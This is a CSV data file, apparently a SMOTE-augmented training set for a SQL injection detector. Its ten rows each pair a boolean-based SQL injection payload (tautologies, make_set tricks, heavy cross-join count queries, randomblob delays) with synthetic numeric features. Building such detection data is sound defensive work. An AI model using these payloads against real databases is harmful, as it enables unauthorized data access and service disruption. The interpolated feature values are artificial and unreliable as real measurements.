id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000102,1.1580790549119986,81.96812445405189,18.406375109189625,2.847559650059022,6.187249781620757,23.10956266378443,42.374499563241514,10.29681244540519,0.07452028310023895,0.28366099609468426,0.5161229536814115,0.12569576712366534,0.0,1.1102230246251565e-16,0.703187554594811,0.0,0.703187554594811,2.0,0.0,6.5936248908103785,0.0,0.0,0.29681244540518903,3.406375109189622,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.296812445405189,0.703187554594811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,boolean,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000249,1.1086000812405523,75.13321443815639,22.244523707895745,3.1741565341275026,7.177916488817559,16.0,36.266428876312766,15.688869073026064,0.09731726677303265,0.21325563727629376,0.48055358440640705,0.20887351154426648,0.0,4.0,1.0,0.0,0.6888690730260637,2.0,0.0,5.377738146052128,1.9999999999999998,0.3111309269739362,0.3111309269739362,3.688869073026064,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.3595815309299517,76.5893509335666,24.87774223587949,3.7549546639943974,24.510968943517966,13.0,27.711608697687122,11.366773292361525,0.3217558935491942,0.17020279361570212,0.3598556860687579,0.14818562676634572,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.1222577641205087,0.0,4.244515528241017,0.0,1.0,1.0,1.1222577641205085,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000234,0.9594809743608567,130.79922996602426,29.37120856172122,3.9364741276954183,62.68560428086061,10.0,38.11362568516366,20.0,0.4794625779624616,0.0765012352512088,0.29103371628391195,0.1530024705024176,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.68560428086061,0.3143957191393898,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6856042808606102,0.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,0.16001697723236086,123.84820591129406,35.0,3.8529555666621254,36.42410295564703,23.0,48.36351681912602,16.060586136521003,0.29396648571230183,0.18583415014184537,0.3904811990392491,0.1297181651066037,2.0,1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,8.060586136521003,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.06058613652100375,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000250,0.9652908624111455,95.73711562620045,24.030192411228764,3.178558066113017,20.030192411228764,13.0,47.35346160748584,15.353461607485842,0.2089571011605976,0.13595172649241918,0.49487078801031514,0.16022038433666802,0.0,4.0,0.0,0.0,0.3232691962570785,1.6767308037429214,0.0,8.0,0.0,0.6767308037429214,0.6767308037429214,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.5271652882699144,87.79687503053995,27.36953125458099,3.641759947665251,22.31875001221598,16.0,35.898437515269976,13.579687503053995,0.2527475846000772,0.1840655192499035,0.4079672403750482,0.15521965577497107,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.2101562484730026,0.0,5.579687503053995,0.0,0.7898437515269973,1.0,2.2101562484730026,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000199,0.8132439948560457,141.87009856302228,32.17731906496411,4.327072026127495,84.35463812992822,7.628865108273517,33.709276259856445,16.17731906496411,0.5972615597173235,0.05275658940718904,0.2359627061650453,0.11401914471044217,3.725773021654704,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.4515460433094067,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7257730216547036
SMOTE_000009,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000140,2.4398360988246903,79.51096707961128,25.852558985242634,3.633642079680415,28.75182784660188,8.953290123883384,30.054021262524138,11.75182784660188,0.36901860560949395,0.10548103933883053,0.3784161340891534,0.14708422096252208,0.0,1.449634430679624,2.0,0.0,1.0,1.449634430679624,0.0,3.75182784660188,0.5503655693203761,0.5503655693203761,0.5503655693203761,4.449634430679624,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.449634430679624,1.0,0.0,1.449634430679624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8992688613592477
SMOTE_000010,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.8006672487166722,156.82966112838224,34.68559320795753,4.304188001711278,78.2008475442973,17.0,43.628813584084945,18.0,0.49844141008942444,0.10847325953380216,0.27823129087039455,0.11485403950637876,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,3.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.3144067920424718,0.6855932079575282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
